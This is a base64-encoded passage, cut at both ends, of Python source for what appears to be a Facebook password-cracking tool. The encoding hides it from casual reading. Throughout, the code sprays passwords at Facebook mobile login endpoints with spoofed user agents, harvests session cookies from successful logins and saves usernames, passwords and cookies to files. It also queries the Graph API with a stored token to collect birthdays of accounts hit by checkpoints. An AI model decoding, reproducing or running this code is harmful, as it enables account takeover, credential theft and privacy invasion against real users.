NhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10iLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC4xLjI7IE5va2lhX1ggQnVpbGQvSlpPNTRLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMzAuMC4xNTk5LjgyIE1vYmlsZSBTYWZhcmkvNTM3LjM2IE5va2lhQnJvd3Nlci8xLjIuMC4xMiIsIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjEuMTsgTmF2b3JpIFFMIFN0aXggMzUwMCBCdWlsZC9MTVk0OUY7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNjcuMC4zMzk2Ljg3IFNhZmFyaS81MzcuMzYiLCJOb2tpYUMzLTAwLzUuMCAoMDcuMjApIFByb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMSBNb3ppbGxhLzUuMCBBcHBsZVdlYktpdC80MjArIChLSFRNTCwgbGlrZSBHZWNrbykgU2FmYXJpLzQyMCsiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBBU1VTX1owMEFEIEJ1aWxkL0xSWDIxVikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiW0ZCQU4vRkI0QSxGQkFWLzIyMi4wLjAuNDguMTEzO0ZCQlYvMTU1MzIzMzY2O0ZCRE0ve2RlbnNpdHk9Mi4wLHdpZHRoPTcyMCxoZWlnaHQ9MTM2MH07RkJMQy9zcl9SUztGQlJWLzE1NjYyNTY5NjtGQkNSL210OnM7RkJNRi9IVUFXRUk7RkJCRC9IVUFXRUksLkZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL0xETi1MMjE7RkJTVi84LjAuMDtGQk9QLzE5LkZCQ0EvYXJtZWFiaS12N2E6YXJtZWFiaSxdIiwiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC45MyBTYWZhcmkvNTM3LjM2Il0pDQogICAgICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICAgIAl1YSA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL2l0X0lUO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScNCiAgICAgICAgZWxpZiAiZ2tfcmFuZG9tIiBpbiBzZWxmLnVnZW46DQogICAgICAgIAl0cnk6DQogICAgICAgIAkgICAgdWEgPSBvcGVuKCd1YS50eHQnLCAncicpLnJlYWQoKQ0KICAgICAgICAJZXhjZXB0IElPRXJyb3I6DQogICAgICAgIAkgICAgdWEgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQogICAgICAgIGZvciBwdyBpbiBtYW51YWw6DQogICAgICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgIHNlcy5oZWFkZXJzLnVwZGF0ZSh7Ikhvc3QiOiJtLmZhY2Vib29rLmNvbSIsInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwidXNlci1hZ2VudCI6dWEsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsImRudCI6IjEiLCJ4LXJlcXVlc3RlZC13aXRoIjoibWFyay52aWEuZ3AiLCJzZWMtZmV0Y2gtc2l0ZSI6Im5vbmUiLCJzZWMtZmV0Y2gtbW9kZSI6Im5hdmlnYXRlIiwic2VjLWZldGNoLXVzZXIiOiI/MSIsInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLCJyZWZlcmVyIjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS8iLCJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIiwiYWNjZXB0LWxhbmd1YWdlIjoiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcifSkNCiAgICAgICAgICAgIHAgPSBzZXMuZ2V0KCdodHRwczovL20uZmFjZWJvb2suY29tL2luZGV4LnBocD9uZXh0PWh0dHBzJTNBJTJGJTJGZGV2ZWxvcGVycy5mYWNlYm9vay5jb20lMkZ0b29scyUyRmRlYnVnJTJGYWNjZXNzdG9rZW4lMkYnKS50ZXh0DQogICAgICAgICAgICBkYXRhYSA9eyJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKHApKS5ncm91cCgxKSwiamF6b2VzdCI6cmUuc2VhcmNoKCduYW1lPSJqYXpvZXN0IiB2YWx1ZT0iKC4qPykiJywgc3RyKHApKS5ncm91cCgxKSwidWlkIjp1c2VyLCJmbG93IjoibG9naW5fbm9fcGluIiwicGFzcyI6cHcsIm5leHQiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tL3Rvb2xzL2RlYnVnL2FjY2Vzc3Rva2VuLyJ9DQogICAgICAgICAgICBzZXMuaGVhZGVycy51cGRhdGUoeyJIb3N0IjoibS5mYWNlYm9vay5jb20iLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJvcmlnaW4iOiJodHRwczovL20uZmFjZWJvb2suY29tIiwiY29udGVudC10eXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwidXNlci1hZ2VudCI6dWEsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6Im5hdmlnYXRlIiwic2VjLWZldGNoLXVzZXIiOiI/MSIsInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLCJyZWZlcmVyIjoiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43In0pDQogICAgICAgICAgICBwbyA9IHNlcy5wb3N0KCdodHRwczovL20uZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wJyxkYXRhPWRhdGFhLGFsbG93X3JlZGlyZWN0cz1GYWxzZSk7amVkYSgyKQ0KICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgICAgIAlrdWtpcz0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgcHJpbnQgKCdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAnJShILHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9rLmFwcGVuZCgnJXMg4peKICVzIOKXiiAlcyclKHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9wZW4oJ09LLyVzLnR4dCclKHdha3R1KSwgJ2EnKS53cml0ZSgnICotLT4gJXMg4peKICVzIOKXiiAlc1xuJyUodXNlcixwdyxrdWtpcykpDQogICAgICAgICAgICAgICAgaWt1dGlfZ3coa3VraXMpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICAgICAgaWYgIm11bmN1bCIgaW4gc2VsZi5vcHNpX2M6DQogICAgICAgICAgICAJICAgIHRyeToNCiAgICAgICAgICAgIAkgICAgICAgIHJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcpLnJlYWQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgbGFoaXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcyclKHVzZXIscm9teikpLmpzb24oKVsnYmlydGhkYXknXQ0KICAgICAgICAgICAgICAgICAgICAgICAgbW9udGgsIGRheSwgeWVhciA9IGxhaGlyLnNwbGl0KCcvJykNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuY3I0Y2sodXNlcixwdyxkYXksbW9udGgseWVhcikNCiAgICAgICAgICAgICAgICAgICAgICAgIGNwLmFwcGVuZCgiJXMg4peKICVzIOKXiiAlcyAlcyAlcyIlKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlc1xuIiUgKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICAgICAgICAgICAgICAJZGF5ID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoICAgPSAnJw0KICAgICAgICAgICAgICAgICAgICAgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5jcjNjayh1c2VyLHB3KQ0KICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQoJyVzIOKXiiAlcyclKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgZWxpZiAiZ2tfbXVuY3VsIiBpbiBzZWxmLm9wc2lfYzoNCiAgICAgICAgICAgICAgICAJdHJ5Og0KICAgICAgICAgICAgICAgIAkgICAgcm9teiA9IG9wZW4oJ2RhdGEvdG9rZW4udHh0JykucmVhZCgpDQogICAgICAgICAgICAgICAgCSAgICBsYWhpciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXM/YWNjZXNzX3Rva2VuPSVzJyUodXNlcixyb216KSkuanNvbigpWydiaXJ0aGRheSddDQogICAgICAgICAgICAgICAgCSAgICBtb250aCwgZGF5LCB5ZWFyID0gbGFoaXIuc3BsaXQoJy8nKQ0KICAgICAgICAgICAgICAgIAkgICAgcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzICAnICUgKEssdXNlcixwdyxkYXksbW9udGgseWVhcikNCiAgICAgICAgICAgICAgICAJICAgIGNwLmFwcGVuZCgiJXMg4peKICVzIOKXiiAlcyAlcyAlcyIlKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgIAkgICAgb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlc1xuIiUgKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgIAkgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAJZXhjZXB0IEtleUVycm9yOg0KICAgICAgICAgICAgICAgIAkgICAgZGF5ID0gJycNCiAgICAgICAgICAgICAgICAJICAgIG1vbnRoICAgPSAnJw0KICAgICAgICAgICAgICAgIAkgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgIAlleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1c2VyLHB3KQ0KICAgICAgICAgICAgICAgIAljcC5hcHBlbmQoJyVzIOKXiiAlcyclKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgIAlvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQogICAgICAgICAgICAgICAgCWJyZWFrDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgCWNvbnRpbnVlDQogICAgICAgIGxvb3AgKz0gMQ0KICAgICAgICB3YXJuYSA9IHJhbmRvbS5jaG9pY2UoW00sIEgsIEssIEIsIFUsIE8sIFBdKQ0KICAgICAgICBwcmludCgnXHInK3dhcm5hKyfigKJceDFiWzE7OTZtIFtjcmFja10gJXMvJXMgW09LOiVzXS1bQ1A6JXNdJyUobG9vcCxsZW4oc2VsZi5pZCksbGVuKG9rKSxsZW4oY3ApKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgIyBPUFNJIFNBQVQgQ1JBQ0sNCiAgICBkZWYgY3I0Y2soc2VsZix1aWQscHcsZGF5LG1vbnRoLHllYXIpOg0KICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgbWIgPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIpDQogICAgICAgIHVhID0gKCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBBU1VTX1owMEFEIEJ1aWxkL0xSWDIxVikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IikNCiAgICAgICAgb3B0aW9uID0gW10NCiAgICAgICAgc2VzLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6ICJtYmFzaWMuZmFjZWJvb2suY29tIiwiY2FjaGUtY29udHJvbCI6ICJtYXgtYWdlPTAiLCJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCJvcmlnaW4iOiBtYiwiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsInVzZXItYWdlbnQiOiB1YSwiYWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLCJ4LXJlcXVlc3RlZC13aXRoIjogIm1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiAic2FtZS1vcmlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6ICJuYXZpZ2F0ZSIsInNlYy1mZXRjaC11c2VyIjogIj8xIiwic2VjLWZldGNoLWRlc3QiOiAiZG9jdW1lbnQiLCJyZWZlcmVyIjogbWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCJhY2NlcHQtZW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ICJpZC1JRCxpZDtxPTAuOSJ9KQ0KICAgICAgICBkYXRhID0ge30NCiAgICAgICAgZ2VkID0gcGFyc2VyKHNlcy5nZXQobWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCBoZWFkZXJzPXsidXNlci1hZ2VudCI6dWF9KS50ZXh0LCAiaHRtbC5wYXJzZXIiKQ0KICAgICAgICBmbSA9IGdlZC5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCiAgICAgICAgbGlzdCA9IFsibHNkIiwiamF6b2VzdCIsIm1fdHMiLCJsaSIsInRyeV9udW1iZXIiLCJ1bnJlY29nbml6ZWRfdHJpZXMiLCJsb2dpbiIsImJpX3hyd2giXQ0KICAgICAgICBmb3IgaSBpbiBmbS5maW5kX2FsbCgiaW5wdXQiKToNCiAgICAgICAgICAgIGlmIGkuZ2V0KCJuYW1lIikgaW4gbGlzdDoNCiAgICAgICAgICAgIAlkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGRhdGEudXBkYXRlKHsiZW1haWwiOnVpZCwicGFzcyI6cHd9KQ0KICAgICAgICBydW4gPSBwYXJzZXIoc2VzLnBvc3QobWIrZm0uZ2V0KCJhY3Rpb24iKSwgZGF0YT1kYXRhLCBhbGxvd19yZWRpcmVjdHM9VHJ1ZSkudGV4dCwgImh0bWwucGFyc2VyIikNCiAgICAgICAgdXJsUG9zdD1zZXMucG9zdChtYitmbS5nZXQoImFjdGlvbiIpLGRhdGE9ZGF0YSkNCiAgICAgICAgaWYgIlRlbXVrYW4gQWt1biBBbmRhIiBpbiByZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIodXJsUG9zdC50ZXh0KSk6DQogICAgICAgIAlwcmludCgiXHIgICAgICAlcyEgbW9kZSBwZXNhd2F0a2FuIDIgZGV0aWsgICAiJShNKSkNCiAgICAgICAgaWYgImNoZWNrcG9pbnQiIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICBmb3JtID0gcnVuLmZpbmQoImZvcm0iKQ0KICAgICAgICAgICAgdGl0bGU9cmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJ1bikpDQogICAgICAgICAgICBsaW5rMj1ydW4uZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQogICAgICAgICAgICBkdHNnID0gZm9ybS5maW5kKCJpbnB1dCIseyJuYW1lIjoiZmJfZHRzZyJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAganpzdCA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Imphem9lc3QifSlbInZhbHVlIl0NCiAgICAgICAgICAgIG5oICAgPSBmb3JtLmZpbmQoImlucHV0Iix7Im5hbWUiOiJuaCJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAgZGF0YUQgPSB7ImZiX2R0c2ciOiBkdHNnLCJmYl9kdHNnIjogZHRzZywiamF6b2VzdCI6IGp6c3QsImphem9lc3QiOiBqenN0LCJjaGVja3BvaW50X2RhdGEiOiIiLCJzdWJtaXRbQ29udGludWVdIjoiTGFuanV0a2FuIiwibmgiOiBuaH0NCiAgICAgICAgICAgIHhueHggPSBwYXJzZXIoc2VzLnBvc3QobWIrZm9ybVsiYWN0aW9uIl0sIGRhdGE9ZGF0YUQpLnRleHQsICJodG1sLnBhcnNlciIpDQogICAgICAgICAgICBuZ2V3ID0gW3l5LnRleHQgZm9yIHl5IGluIHhueHguZmluZF9hbGwoIm9wdGlvbiIpXQ0KICAgICAgICAgICAgcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzICAnICUgKEssdWlkLHB3LGRheSxtb250aCx5ZWFyKQ0KICAgICAgICAgICAgZm9yIG9wdCBpbiByYW5nZShsZW4obmdldykpOiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHByaW50KCIgICAgICAlcyVzLiAlcyVzICIlKFAsc3RyKG9wdCsxKSxLLG5nZXdbb3B0XSkpDQogICAgICAgICAgICBpZiAiMCIgaW4gc3RyKGxlbihuZ2V3KSk6DQogICAgICAgICAgICAJaWYgIkxpaGF0IGRldGFpbCBsb2dpbiB5YW5nIGRpdGFtcGlsa2FuLiBJbmkgQW5kYT8iIGluIHRpdGxlOg0KICAgICAgICAgICAgCSAgICBjb2tpID0gKCI7Iikuam9pbihbICIlcz0lcyIgJSAoa2V5LCB2YWx1ZSkgZm9yIGtleSwgdmFsdWUgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpIF0pDQogICAgICAgICAgICAgICAgICAgIGlmICJ1YmFoIiBpbiBzZWxmLnViYWhfcGFzczoNCiAgICAgICAgICAgICAgICAgICAgCXNlbGYudWJhaF9wdyh1aWQscHcsc2VzLHJ1bixsaW5rMikNCiAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgCXByaW50KCJcciAgICAgICVz4oiaIGFrdW4gb25lIHRhYiwgc2lsYWhrYW4gYW5kYSBsb2dpbiAgICAiJShIKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJ09LLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1aWQscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgIGVsaWYgIk1hc3Vra2FuIEtvZGUgTWFzdWsgdW50dWsgTWVsYW5qdXRrYW4iIGluIHJlLmZpbmRhbGwoIlw8dGl0bGU+KC4qPyk8XC90aXRsZT4iLHN0cihydW4pKToNCiAgICAgICAgICAgICAgICAJcHJpbnQoIlxyICAgICAgJXPDlyBha3VuIHRlcnBhc2FuZyBhdXRlbnRpZmlrYXNpIDIgZmFrdG9yICAgIiUoTSkpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAJcHJpbnQoIlxyICAgICAgJXMhIHRlcmtlbmEgc3BhbSwgbW9kZSBwZXNhd2F0a2FuIDIgZGV0aWsgICAiJShNKSkNCiAgICAgICAgICAgIHByaW50KCJcciVzIyVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0lcz4iJShQLE0sUCkpDQogICAgICAgIGVsaWYgImNfdXNlciIgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgCXByaW50ICdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlcyAgJyAlIChLLHVpZCxwdyxkYXksbW9udGgseWVhcikNCiAgICAgICAgCXByaW50KCJcciAgICAgICVz4oiaIGFrdW4gdGlkYWsgY2hlY2twb2ludCwgc2lsYWhrYW4gYW5kYSBsb2dpbiAgICIlKEgpKQ0KICAgICAgICAJcHJpbnQoIlxyJXMjJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSVzPiIlKFAsTSxQKSkNCiAgICAgICAgCW9wZW4oJ09LLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1aWQscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICBlbGlmICJsb2dpbl9lcnJvciIgaW4gc3RyKHJ1bik6DQogICAgICAgIAlwcmludCAnXHIgJXMqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXMgICcgJSAoSyx1aWQscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgIAlwcmludCgiXHIlcyMlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJXM+IiUoUCxNLFApKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzICAnICUgKEssdWlkLHB3LGRheSxtb250aCx5ZWFyKQ0KICAgICAgICAJcHJpbnQoIlxyJXMjJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSVzPiIlKFAsTSxQKSkNCiAgICBkZWYgY3IzY2soc2VsZix1aWQscHcpOg0KICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgbWIgPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIpDQogICAgICAgIHVhID0gKCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBBU1VTX1owMEFEIEJ1aWxkL0xSWDIxVikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IikNCiAgICAgICAgb3B0aW9uID0gW10NCiAgICAgICAgc2VzLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6ICJtYmFzaWMuZmFjZWJvb2suY29tIiwiY2FjaGUtY29udHJvbCI6ICJtYXgtYWdlPTAiLCJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCJvcmlnaW4iOiBtYiwiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsInVzZXItYWdlbnQiOiB1YSwiYWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLCJ4LXJlcXVlc3RlZC13aXRoIjogIm1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiAic2FtZS1vcmlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6ICJuYXZpZ2F0ZSIsInNlYy1mZXRjaC11c2VyIjogIj8xIiwic2VjLWZldGNoLWRlc3QiOiAiZG9jdW1lbnQiLCJyZWZlcmVyIjogbWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCJhY2NlcHQtZW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ICJpZC1JRCxpZDtxPTAuOSJ9KQ0KICAgICAgICBkYXRhID0ge30NCiAgICAgICAgZ2VkID0gcGFyc2VyKHNlcy5nZXQobWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCBoZWFkZXJzPXsidXNlci1hZ2VudCI6dWF9KS50ZXh0LCAiaHRtbC5wYXJzZXIiKQ0KICAgICAgICBmbSA9IGdlZC5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCiAgICAgICAgbGlzdCA9IFsibHNkIiwiamF6b2VzdCIsIm1fdHMiLCJsaSIsInRyeV9udW1iZXIiLCJ1bnJlY29nbml6ZWRfdHJpZXMiLCJsb2dpbiIsImJpX3hyd2giXQ0KICAgICAgICBmb3IgaSBpbiBmbS5maW5kX2FsbCgiaW5wdXQiKToNCiAgICAgICAgICAgIGlmIGkuZ2V0KCJuYW1lIikgaW4gbGlzdDoNCiAgICAgICAgICAgIAlkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGRhdGEudXBkYXRlKHsiZW1haWwiOnVpZCwicGFzcyI6cHd9KQ0KICAgICAgICBydW4gPSBwYXJzZXIoc2VzLnBvc3QobWIrZm0uZ2V0KCJhY3Rpb24iKSwgZGF0YT1kYXRhLCB